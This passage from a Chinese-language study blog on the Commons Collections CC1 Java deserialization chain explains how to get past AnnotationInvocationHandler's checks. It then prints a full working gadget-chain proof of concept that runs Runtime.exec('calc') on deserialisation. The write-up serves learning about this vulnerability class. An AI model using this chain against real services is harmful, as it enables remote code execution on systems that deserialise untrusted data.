                new AnnotationTypeMismatchExceptionProxy(  
                    value.getClass() + "[" + value + "]").setMember(  
                        annotationType.members().get(name)));
```
我们发现我们还有两个问题需要解决，一是value的值我们希望是chain，而是我们还需要构造通过if判断，一个一个解决这两个问题
这里的两个if是第一个注解成员是不是空的，我们用的确实是空的所以直接不通过，所以我们要换一个注解成员不为空的，同时还要通过第二个if，第二个if比较好通过，保证value的类型和它不一致同时不是哪个错误里的就行
我们选择了target这个注释
就可以通过判断进入setvalue这个我们梦寐以求的代码里了。但是非常不幸的是我们进入之后发现这个value的参数我们没办法控制，这个value是固定的。这时候好像走入死胡同了，接下来将出现神之一手，之前那几个transformer的几个实现类里面有一个是无论什么输入都会转换成固定值，那我们在chain里第一个放上一个，那我们不管它的value是什么到我们这里都可以成为我们想要的值，真实冥冥之中都是写好的，能发现这个漏洞的也是真厉害。
```java
  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.map.TransformedMap;  
  
import java.io.*;  
import java.lang.annotation.Target;  
import java.lang.reflect.Constructor;  
import java.util.HashMap;  
import java.util.Map;  
  
// 解决了第一个问题  
public class CC1Step1 {  
    public static void main(String[] args) throws Exception {  
        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(Runtime.class),  
                new InvokerTransformer("getMethod"  
                        , new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),  
                new InvokerTransformer("invoke"  
                        , new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),  
                new InvokerTransformer("exec"  
                        , new Class[]{String.class}, new Object[]{"calc"})  
        };  
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
        HashMap<Object, Object> hashMap = new HashMap<>();  
        hashMap.put("value","cc");  
        Map<Object, Object> transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);  
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
        Constructor aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);  
        aihConstructor.setAccessible(true);  
        Object o = aihConstructor.newInstance(Target.class, transformedMap);  
  
        // 序列化反序列化  
        serialize(o);  
        unserialize("ser.bin");  
    }  
    public static void serialize(Object obj) throws IOException {  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
        oos.writeObject(obj);  
    }  
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{  
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  
        Object obj = ois.readObject();  
        return obj;  
    }  
}
```
伟大无需多言。


## 调用链回顾

接下来我们再梳理一遍这个思路，我们首先发现invoketransformer里面可以任意在执行命令，我们接着找谁可以调用这个transformer方法，我们发现了transformermap里面的checkvalueset，然后 接着往上找我们找到了setvalue，然后这个还被readobject调用，这样我们的反序列化链条就完善了。

---

**本系列笔记：** [Java安全学习](/2026/11/01/java-security-urldns/) · [Java 反序列化漏洞：CommonsCollections1（CC1）学习笔记](/2026/11/01/cc1-study-notes/) · [cc1链学习](/2026/11/01/cc1-transformedmap/) · [正版cc1链学习](/2026/11/01/cc1-lazymap/) · [cc3链学习](/2026/11/01/cc3-classloading/) · [cc6链学习](/2026/11/01/cc6-study/) · [cc4链的学习](/2026/11/06/cc4-study/) · [cc2学习](/2026/11/10/cc2-study/) · [CC5 学习笔记](/2026/11/13/cc5-study/)
